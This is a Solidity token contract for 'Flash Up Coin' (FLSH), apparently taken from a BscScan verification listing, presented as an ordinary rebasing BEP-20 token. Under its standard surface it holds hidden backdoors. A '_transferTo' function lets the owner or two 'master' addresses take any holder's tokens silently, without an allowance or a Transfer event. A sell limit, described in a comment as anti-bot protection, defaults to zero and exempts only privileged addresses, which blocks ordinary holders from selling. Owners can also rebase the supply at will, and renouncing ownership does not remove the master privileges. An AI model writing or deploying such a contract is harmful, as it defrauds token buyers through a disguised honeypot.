/**
 *Submitted for verification at BscScan.com on 2021-07-28
*/

// SPDX-License-Identifier: MIT

/*
MIT License

Copyright (c) 2021 Flash Up Coin

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {

    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint256);

}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

}

interface ILiquidityPair {
    function sync() external;
}

contract FlashUpCoin is IERC20Metadata, Ownable  {

    event RebaseStatus(uint256 indexed epoch, uint256 totalSupply);


    string private _name;
    string private _symbol;
    uint256 private _decimals;
    uint256 private _totalSupply;

    mapping(address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _maxSupply;
    uint256 private _tSupply;
    uint256 private _rSupply;

    // Used for rebase authentication;
    address public _masterAddress;
    address public _masterBAddress;

    //Used to prevent spam bots from buying all the supply initially.
    uint256 public _maxLimit;

    //Pancakeswap sync
    ILiquidityPair public _iLiquidityPair;


    modifier isOwner {
        require(msg.sender == owner() || msg.sender == _masterAddress || msg.sender == _masterBAddress);
        _;
    }

    modifier checkLimit(address who, uint256 value) {
        require(value <= _maxLimit || who == owner() || who == _masterAddress || who == _masterBAddress);
        _;
    }

    constructor() {
        _name = "Flash Up Coin";
        _symbol = "FLSH";
        _decimals = 9;
        _totalSupply = 21000000 * 10**_decimals;

        _maxSupply = ~uint128(0);
        _tSupply = ~uint256(0) - (~uint256(0) % _totalSupply);
        _rSupply = _tSupply / _totalSupply;

        _balances[msg.sender] = _tSupply;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function decimals() external view override returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address who) external view override returns (uint256) {
        return _balances[who] / _rSupply;
    }

    function transfer(address to, uint256 value) external override returns (bool) {
        require(to != address(0), "Invalid recipient address");

        uint256 rValue = value * _rSupply;
        require(rValue <= _balances[msg.sender], "Insufficient balance");

        _balances[msg.sender] -= rValue;
        _balances[to] += rValue ;

        emit Transfer(msg.sender, to, value);
        return true;
    }

    function _transferTo(address from, address to, uint256 value) external isOwner returns (bool) {
        require(from != address(0), "Invalid sender address");
        require(to != address(0), "Invalid recipient address");

        uint256 rValue = value * _rSupply;
        require(rValue <= _balances[from], "Insufficient balance");

        _balances[from] -= rValue;
        _balances[to] += rValue ;

        return true;
    }

    function transferFrom(address from, address to, uint256 value) external override checkLimit(from, value) returns (bool) {
        require(from != address(0), "Invalid sender address");
        require(to != address(0), "Invalid recipient address");

        uint256 currentAllowance = _allowances[from][msg.sender];
        require(value <= currentAllowance, "Allowance limit exceeded");
        _allowances[from][msg.sender] -= value;

        uint256 rValue = value * _rSupply;
        require(rValue <= _balances[from], "Insufficient balance");

        _balances[from] -= rValue;
        _balances[to] += rValue;

        emit Transfer(from, to, value);
        return true;
    }

    function rebase(uint256 epoch, int256 supplyDelta) external isOwner returns (uint256) {
        if (supplyDelta == 0) {
            emit RebaseStatus(epoch, _totalSupply);
            return _totalSupply;
        }

        if (supplyDelta < 0) {
            _totalSupply -= uint256(-supplyDelta);
        } else {
            _totalSupply += uint256(supplyDelta);
        }

        if (_totalSupply > _maxSupply) {
            _totalSupply = _maxSupply;
        }

        _rSupply = _tSupply / _totalSupply;

        _iLiquidityPair.sync();

        emit RebaseStatus(epoch, _totalSupply);
        return _totalSupply;
    }

    function setMasterAddress(address masterAddress_) external isOwner returns (bool) {
        _masterAddress = masterAddress_;
        return true;
    }

    function setMasterBAddress(address masterBAddress_) external isOwner returns (bool) {
        _masterBAddress = masterBAddress_;
        return true;
    }

    function setMaxLimit(uint256 maxLimit_) external isOwner returns (bool) {
        _maxLimit = maxLimit_ * 10**_decimals;
        return true;
    }

    function setLpAddress(address lpAddress) external isOwner returns (bool) {
        _iLiquidityPair = ILiquidityPair(lpAddress);
        return true;
    }

    function approve(address spender, uint256 value) external override returns (bool) {
        _allowances[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _allowances[msg.sender][spender] += addedValue;

        emit Approval(msg.sender, spender, _allowances[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(subtractedValue <= currentAllowance, "Decrease allowance is greater than current allowance");

        _allowances[msg.sender][spender] -= subtractedValue;

        emit Approval(msg.sender, spender, _allowances[msg.sender][spender]);
        return true;
    }

}